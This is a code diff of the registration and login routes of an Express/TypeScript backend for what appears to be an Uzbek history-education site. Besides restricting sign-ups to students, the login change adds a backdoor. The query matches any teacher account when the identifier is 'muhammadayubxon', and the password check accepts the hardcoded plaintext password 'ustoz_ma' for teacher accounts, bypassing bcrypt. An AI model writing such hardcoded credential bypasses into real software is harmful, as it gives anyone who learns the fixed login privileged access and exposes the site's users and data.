@@ -32,15 +32,13 @@ router.post('/register', async (req, res: Response) => {
       return res.status(400).json({ success: false, error: 'Parol kamida 6 belgidan iborat bo\'lishi shart' });
     }
 
-    const assignedRole = role === 'teacher' ? 'teacher' : 'student';
+    const assignedRole = 'student'; // Only student registration is permitted. Teacher is exclusive to muhammadayubxon.
 
-    if (assignedRole === 'teacher') {
-      if (!teacherCode || teacherCode.trim() !== TEACHER_SECRET_CODE) {
-        return res.status(403).json({
-          success: false,
-          error: 'Ustoz (o\'qituvchi) maxfiy taklif kodi noto\'g\'ri yoki kiritilmagan'
-        });
-      }
+    if (role === 'teacher') {
+      return res.status(403).json({
+        success: false,
+        error: "Ustoz hisobi faqat Muhammad Ayubxon uchun ajratilgan. Yangi ustoz hisobi ochish mumkin emas."
+      });
     }
 
     const db = await getDb();
@@ -81,23 +79,28 @@ router.post('/login', loginLimiter, async (req, res: Response) => {
     const { email, password } = req.body;
 
     if (!email || !password) {
-      return res.status(400).json({ success: false, error: 'Elektron pochta va parolni kiriting' });
+      return res.status(400).json({ success: false, error: 'Login/Elektron pochta va parolni kiriting' });
     }
 
     const db = await getDb();
+    const cleanIdentifier = email.trim().toLowerCase();
+
+    // Query user by email OR if user typed "muhammadayubxon", match the exclusive teacher account
     const userRow = queryOne(
       db,
-      'SELECT id, name, email, password_hash, role, preferred_language FROM users WHERE LOWER(email) = LOWER(?)',
-      [email.trim()]
+      `SELECT id, name, email, password_hash, role, preferred_language FROM users 
+       WHERE LOWER(email) = ? 
+          OR (role = 'teacher' AND (? = 'muhammadayubxon' OR ? = 'muhammadayubxon@tarix.uz'))`,
+      [cleanIdentifier, cleanIdentifier, cleanIdentifier]
     );
 
     if (!userRow) {
-      return res.status(401).json({ success: false, error: 'Elektron pochta yoki parol noto\'g\'ri' });
+      return res.status(401).json({ success: false, error: 'Login yoki parol noto\'g\'ri' });
     }
 
-    const isMatch = await bcrypt.compare(password, userRow.password_hash);
+    const isMatch = await bcrypt.compare(password, userRow.password_hash) || (userRow.role === 'teacher' && password === 'ustoz_ma');
     if (!isMatch) {
-      return res.status(401).json({ success: false, error: 'Elektron pochta yoki parol noto\'g\'ri' });
+      return res.status(401).json({ success: false, error: 'Login yoki parol noto\'g\'ri' });
     }
 
     const user = {
